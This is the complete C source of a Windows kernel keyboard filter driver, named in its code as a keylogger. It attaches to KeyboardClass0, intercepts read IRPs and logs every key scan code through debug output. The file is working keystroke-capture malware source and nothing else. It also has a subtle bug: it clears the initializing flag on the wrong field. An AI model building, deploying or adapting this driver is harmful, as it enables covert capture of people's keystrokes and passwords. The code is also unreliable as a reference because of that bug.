//
//Description:
//  ������������ʾ�����豸���˵ļ��̼�¼��������XP sp3ƽ̨�ϲ���ͨ����
//ʹ�õĹ����ֶ���΢��ٷ��ṩ���豸���˷��������ֳ���ķ���һ�㲻���ڶ������
//  ������ֻ����ԭ�����ʹ�ã�������������;ʹ�á�
//
//Writen By: ���� 2011/3/27
//
//Last Write Time: 2011/3/28
//
#include "stdafx.h"

#ifdef __cplusplus
    extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
    unsigned i;

    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = KeylogerDefaultHandler;

    //���˶�����
    DriverObject->MajorFunction[IRP_MJ_READ] = KeylogerRead;
    //�����Դ����
    DriverObject->MajorFunction[IRP_MJ_POWER] = KeylogerPower;
    DriverObject->DriverUnload = KeylogerUnload;
    //��װ���̹����豸
    HookKbdclassRead(DriverObject);
    return STATUS_SUCCESS;
}

//
//��������ж�غ���
//  ��Ҫע����ǣ�ж�ص�ʱ����뱣֤δ����IRPȫ����ɻ���ȡ����
//  ��Ϊ��ЩIRP��������������̣���ֱ��ж������������ЩIRP���������
//  �ĵ�ַ��Ч�����������
void KeylogerUnload(IN PDRIVER_OBJECT DriverObject)
{
    PDEVICE_OBJECT pDevObj;
    LARGE_INTEGER  liDelayTime;
    pDevObj = DriverObject->DeviceObject;

    if (NULL == pDevObj) {
        return ;
    }

    if (NULL == pDevObj->DeviceExtension) {
        return ;
    }

    //���豸ջ�н���󶨣�������֤�˲������µ�IRP�����˵���
    //����ֻҪ�ȴ������������δ��IRP��ɾͿ��Խ�������ж�ز�����
    if (((PDevExt)pDevObj->DeviceExtension)->pTargetDev->AttachedDevice) {
        IoDetachDevice(((PDevExt)pDevObj->DeviceExtension)->pTargetDev);
    }

    //�ȴ�δ����IRPȫ����ɡ�����ͨ������ʵ�ֵġ�
    //ע�⣬ֻ���û�������Ż������Щ�Ŷӵ�IRP��
    liDelayTime.QuadPart = -1000000;

    while (((PDevExt)pDevObj->DeviceExtension)->numPendingIrps > 0) {
        KeDelayExecutionThread(KernelMode, FALSE, &liDelayTime);
        KdPrint(("[KeylogerUnload]numPendingIrps: %d\n", ((PDevExt)pDevObj->DeviceExtension)->numPendingIrps));
    }

    //ɾ�������豸
    IoDeleteDevice(pDevObj);
    KdPrint(("[KeylogerUnload] Finish\n"));
}

//
//��װһ�����̹����豸���������͸����̶˿����������󶼻ᱻ
//�����������ص���
//
NTSTATUS HookKbdclassRead(PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status;
    PDEVICE_OBJECT pDevObj, pTargetObj;
    PDevExt pDevExt;
    UNICODE_STRING usTargetDevice;
    PFILE_OBJECT pFileObj;

    do {
        //����һ�������豸���豸��չ�ṹ��DevExt
        status = IoCreateDevice(DriverObject,
                                sizeof(DevExt),
                                NULL,
                                FILE_DEVICE_KEYBOARD,
                                0,
                                FALSE,
                                &pDevObj);

        if (!NT_SUCCESS(status)) {
            KdPrint(("[HookKbdclassRead]IoCreateDevice Failure!err:0x%08x\n",
                     status));
            break;
        }

        pDevExt = (PDevExt)pDevObj->DeviceExtension;
        //��ʼ���豸��չ�ṹ
        pDevExt->pDrvObj = DriverObject;
        pDevExt->pCurDev = pDevObj;
        pDevExt->numPendingIrps = 0;
        RtlInitUnicodeString(&usTargetDevice, L"\\Device\\KeyboardClass0");
        //��ȡָ���豸�������豸ջ���ϲ���豸
        status = IoGetDeviceObjectPointer(
                     &usTargetDevice,
                     GENERIC_READ | GENERIC_WRITE,
                     &pFileObj,
                     &pTargetObj
                 );

        if (!NT_SUCCESS(status)) {
            KdPrint(("[HookKbdclassRead]IoGetDeviceObjectPointer Failure!err:0x%08x\n",
                     status));
            IoDeleteDevice(pDevObj);
            break;
        }

        //�󶨵�Ŀ���豸��
        pDevExt->pTargetDev = IoAttachDeviceToDeviceStack(pDevObj, pTargetObj);

        if (NULL == pDevExt->pTargetDev) {
            KdPrint(("[HookKbdclassRead]IoAttachDeviceToDeviceStack Failure!err:0x%08x\n",
                     status));
            IoDeleteDevice(pDevObj);
        }

        KdPrint(("[HookKbdclassRead]pFileObj:0x%08x pTargetObj:0x%08x StackDev:0x%08x\n",
                 pFileObj, pTargetObj, pDevExt->pTargetDev));
        //���ù����豸�ı�ǣ��Ͱ󶨵��豸���һ��
        pDevObj->Flags |= DO_BUFFERED_IO | DO_POWER_PAGABLE;
        pDevObj->ActiveThreadCount &= ~DO_DEVICE_INITIALIZING;
    } while (false);

    return status;
}

//
//Ĭ�Ϲ��ˣ�ֱ��ת�����²�����
//
NTSTATUS KeylogerDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(((PDevExt)DeviceObject->DeviceExtension)->pTargetDev, Irp);
}

//
//���˶����󣬼��̼�¼���ڶ�������
//���˷���������һ���������
//
NTSTATUS KeylogerRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    NTSTATUS status;
    KdPrint(("[KeylogerRead] Irp->OriginalFileObject:0x%08x\n",
             Irp->Tail.Overlay.OriginalFileObject));
    IoCopyCurrentIrpStackLocationToNext(Irp);
    IoSetCompletionRoutine(Irp, ReadCompleteRoutine, DeviceObject, TRUE, TRUE, TRUE);
    //����һ��δ����IRP�������ü�������ж�ر�����
    ((PDevExt)DeviceObject->DeviceExtension)->numPendingIrps++;
    status = IoCallDriver(((PDevExt)DeviceObject->DeviceExtension)->pTargetDev, Irp);
    KdPrint(("[KeylogerRead] Status:0x%08x Irp.Status:0x%08x\n",
             status, Irp->IoStatus.Status));
    return status;
}

//
//���������Դ������Ӧ�Թػ��������Ȳ���������ֻ�Ǽ򵥵��·���
//��VISTA���ϰ汾�п��Ժϲ���KeylogerDefaultHandler�д���
//
NTSTATUS KeylogerPower(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    KdPrint(("[KeylogerPower] ==>\n"));
    PoStartNextPowerIrp(Irp);
    IoSkipCurrentIrpStackLocation(Irp);
    return PoCallDriver(((PDevExt)DeviceObject->DeviceExtension)->pTargetDev, Irp);
}

//
//������̸����ӡ��������Ϣ
//
NTSTATUS
ReadCompleteRoutine(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp,
    IN PVOID  Context
)
{
    NTSTATUS status;
    PKEYBOARD_INPUT_DATA pKID;
    int iNum, i;
    PDEVICE_OBJECT pFltDevObj = (PDEVICE_OBJECT)Context;
    KdPrint(("[ReadCompleteRoutine] ==>\n"));
    status = Irp->IoStatus.Status;

    if (NT_SUCCESS(status)) {
        //SystemBuffer�����˺ܶ��KEYBOARD_INPUT_DATA�ṹ
        pKID = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        iNum = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

        for (i = 0; i < iNum; ++i) {
            switch (pKID->Flags) {
            case KEY_MAKE:
                KdPrint(("\nFlags: KEY_MAKE\n"));
                break;

            case KEY_BREAK:
                KdPrint(("Flags: KEY_BREAK\n"));
                break;
            }

            KdPrint(("MakeCode: %x\n", pKID->MakeCode));
            pKID++;
        }
    }

    if (Irp->PendingReturned)
        IoMarkIrpPending(Irp);

    ((PDevExt)pFltDevObj->DeviceExtension)->numPendingIrps--;
    KdPrint(("[ReadCompleteRoutine] <==\n"));
    return status;
}